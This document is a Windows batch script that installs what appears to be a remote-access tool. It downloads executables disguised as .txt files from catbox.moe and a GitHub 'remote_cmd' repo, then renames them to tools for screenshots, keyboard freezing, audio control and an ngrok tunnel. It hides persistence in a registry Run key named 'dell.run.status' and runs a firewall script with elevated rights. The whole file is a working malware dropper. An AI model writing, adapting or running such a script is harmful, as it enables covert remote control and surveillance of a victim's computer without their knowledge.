@echo off
setlocal

cd /d "%appdata%"
mkdir server
cd server


curl -O "https://files.catbox.moe/b46s0d.txt"
curl -O "https://files.catbox.moe/25ioju.bat"
curl -O "https://files.catbox.moe/ce9637.txt"
curl -O "https://files.catbox.moe/mkyt46.txt"
curl -O "https://files.catbox.moe/7h10yf.txt"
curl -O "https://files.catbox.moe/flrni9.txt"
curl -O "https://files.catbox.moe/j7b5ne.txt"
curl -O "https://files.catbox.moe/o1nmho.txt"
curl -O "https://files.catbox.moe/9gyo5b.txt"
curl -O "https://files.catbox.moe/c385i3.txt"
curl -O "https://files.catbox.moe/3cm727.txt"
curl -O "https://files.catbox.moe/zq7xxs.txt"
curl -O "https://files.catbox.moe/xr0kl7.txt"
curl -O "https://raw.githubusercontent.com/Flummi24/remote_cmd/refs/heads/main/start.vbs"
curl -O "https://raw.githubusercontent.com/Flummi24/remote_cmd/refs/heads/main/firewall.bat"

copy b46s0d.txt server.exe
copy 25ioju.bat ngrok.bat
copy ce9637.txt ngrok.exe
copy mkyt46.txt lauter.exe
copy 7h10yf.txt leiser.exe
copy flrni9.txt mute.exe
copy o1nmho.txt unmute.exe
copy j7b5ne.txt play.exe
copy 9gyo5b.txt altf4.exe
copy c385i3.txt keyboard_freeze.exe
copy 3cm727.txt keyboard_unfreeze.exe
copy zq7xxs.txt taste.exe
copy xr0kl7.txt screenshot.exe

del b46s0d.txt
del 25ioju.bat
del ce9637.txt
del mkyt46.txt
del flrni9.txt
del j7b5ne.txt
del o1nmho.txt
del 7h10yf.txt
del 9gyo5b.txt
del c385i3.txt
del 3cm727.txt
del zq7xxs.txt
del xr0kl7.txt

set "batpath=%appdata%\server\start.vbs"
set "regfille=%batpath:\=\\%"

echo Windows Registry Editor Version 5.00 > install.reg
echo. >> install.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run] >> install.reg
echo "dell.run.status"="%regfille%%" >> install.reg
regedit /s install.reg

powershell -Command "Start-Process -FilePath '%appdata%\server\firewall.bat' -Verb runAs"

start start.vbs
pause
